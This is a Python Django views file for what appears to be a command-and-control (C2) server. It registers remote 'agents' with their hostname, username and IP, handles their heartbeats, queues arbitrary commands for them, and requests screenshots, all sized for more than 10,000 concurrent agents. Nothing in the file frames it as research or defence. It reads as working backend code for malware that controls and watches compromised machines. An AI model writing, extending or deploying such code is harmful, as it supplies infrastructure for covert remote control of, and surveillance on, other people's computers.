"""
C2 Agents App - Async Views
Optimized for 10,000+ concurrent users
"""

from rest_framework import viewsets, status
from rest_framework.decorators import action, api_view
from rest_framework.response import Response
from django.utils import timezone
from asgiref.sync import sync_to_async
from .models import Agent
from .serializers import AgentSerializer
from .tasks import process_heartbeat_async


class AgentViewSet(viewsets.ModelViewSet):
    """Agent management ViewSet"""
    
    queryset = Agent.objects.all()
    serializer_class = AgentSerializer
    
    def get_queryset(self):
        """Filter by status"""
        queryset = Agent.objects.all()
        status_param = self.request.query_params.get('status', None)
        
        if status_param:
            queryset = queryset.filter(status=status_param)
        
        return queryset
    
    @action(detail=False, methods=['post'])
    def register(self, request):
        """Agent registration endpoint"""
        data = request.data
        agent_id = data.get('agent_id')
        agent_info = data.get('agent_info', {})
        
        # Get or create agent
        agent, created = Agent.objects.update_or_create(
            id=agent_id,
            defaults={
                'hostname': agent_info.get('hostname', 'unknown'),
                'username': agent_info.get('username', 'unknown'),
                'platform': agent_info.get('platform', 'unknown'),
                'ip_address': request.META.get('REMOTE_ADDR', '127.0.0.1'),
                'status': 'active',
                'metadata': agent_info,
            }
        )
        
        return Response({
            'status': 'registered' if created else 'updated',
            'agent_id': str(agent.id)
        }, status=status.HTTP_200_OK)
    
    @action(detail=False, methods=['post'])
    def heartbeat(self, request):
        """
        Heartbeat endpoint - async processing with Celery
        Handles 10,000+ concurrent requests
        """
        agent_id = request.data.get('agent_id')
        
        if not agent_id:
            return Response(
                {'error': 'agent_id required'},
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Async task processing (non-blocking)
        process_heartbeat_async.delay(agent_id, request.META.get('REMOTE_ADDR'))
        
        # Immediate response (don't wait for DB)
        return Response({
            'status': 'ok',
            'timestamp': timezone.now().isoformat(),
            'commands': []  # Commands fetched separately
        }, status=status.HTTP_200_OK)
    
    @action(detail=True, methods=['get'])
    def commands(self, request, pk=None):
        """Get pending commands for agent"""
        from c2_commands.models import Command
        
        agent = self.get_object()
        pending_commands = Command.objects.filter(
            agent=agent,
            status='pending'
        )[:100]  # Limit to 100 commands
        
        from c2_commands.serializers import CommandSerializer
        serializer = CommandSerializer(pending_commands, many=True)
        
        return Response(serializer.data)
    
    @action(detail=True, methods=['post'])
    def screenshot(self, request, pk=None):
        """Take screenshot (async task)"""
        agent = self.get_object()
        
        from c2_commands.tasks import create_screenshot_command
        create_screenshot_command.delay(str(agent.id), request.data.get('quality', 80))
        
        return Response({'status': 'screenshot requested'})


# Async API views for high-performance endpoints
@api_view(['GET'])
async def agent_list_async(request):
    """
    Async agent list - ultra-fast for dashboard
    """
    from .serializers import AgentSerializer
    
    # Async query
    agents = await sync_to_async(list)(
        Agent.objects.filter(status='active')[:1000]
    )
    
    serializer = AgentSerializer(agents, many=True)
    return Response(serializer.data)


@api_view(['POST'])
async def agent_command_async(request, agent_id):
    """
    Async command submission
    """
    from c2_commands.models import Command
    
    # Create command asynchronously
    command = await sync_to_async(Command.objects.create)(
        agent_id=agent_id,
        command_type=request.data.get('type'),
        command_data=request.data.get('data'),
        status='pending'
    )
    
    return Response({
        'command_id': str(command.id),
        'status': 'queued'
    }, status=status.HTTP_201_CREATED)
